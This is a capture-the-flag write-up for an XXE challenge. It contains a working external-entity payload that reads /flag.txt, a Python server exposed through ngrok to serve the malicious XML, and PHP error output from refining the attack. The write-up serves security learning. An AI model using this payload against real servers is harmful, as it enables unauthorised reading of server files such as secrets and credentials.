### Challenge

```
XXExternalXX
74
One of your customer all proud of his new platform asked you to audit it. To show him that you can get information on his server, he hid a file "flag.txt" at the server's root.
```

### Recon
* Looking at the source

```
<!DOCTYPE html>
<html lang="fr" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>XXExternalXX</title>
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
  </head>
  <body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
      <a class="navbar-brand" href="#">XXExternalXX</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarText" aria-controls="navbarText" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarText">
        <ul class="navbar-nav mr-auto">
          <li class="nav-item active">
            <a class="nav-link" href="/">Home</a>
          </li>
          <li class="nav-item active">
            <a class="nav-link" href="?xml=data.xml">Show stored data</a>
          </li>
        </ul>
      </div>
    </nav>
    <div class="container">
        <h1>Welcome to this platform</h1>
    <p>To check all the news we uploaded, please go to the "news" section</p>
        </div>


  </body>
</html>
```

* the heading of the challenge looks like `xml external entity issue` --> Source has a xml feeding endpoint --> `?xml=data.xml`
* Challenge description says flag is in the root folder
* Use DTD File Read through external entity payload and read flag

### Solve

* Payload
```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY data SYSTEM  "file:///flag.txt" >]>
<root>&data</root>
```

* Web Server + Ngrok

```
from http.server import HTTPServer, BaseHTTPRequestHandler
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):

  def do_GET(self):
    print("respond: ")
    self.send_response(200)
    self.send_header("Content-type", 'text/xml')
    self.end_headers()
    data = open("xxe.xml", "r").read().strip()
    print(data)
    self.wfile.write(data.encode())

httpd = HTTPServer(('localhost', 3000), SimpleHTTPRequestHandler)
httpd.serve_forever()
```

* Building from errors
```
<b>Warning</b>:  file_get_contents(http://b59f7e41.ngrok.io): failed to open stream: HTTP request failed! HTTP/1.0 404 Not Found
 in <b>/var/www/html/index.php</b> on line <b>20</b><br />
<br />
<b>Warning</b>:  DOMDocument::loadXML(): Empty string supplied as input in <b>/var/www/html/index.php</b> on line <b>23</b><br />
<br />
<b>Warning</b>:  simplexml_import_dom(): Invalid Nodetype to import in <b>/var/www/html/index.php</b> on line <b>24</b><br />
<br />
<b>Notice</b>:  Trying to get property 'data' of non-object in <b>/var/www/html/index.php</b> on line <b>25</b><br />
<!DOCTYPE html>
<html lang="fr" dir="ltr">
```

* Flag: exploit.png has the flag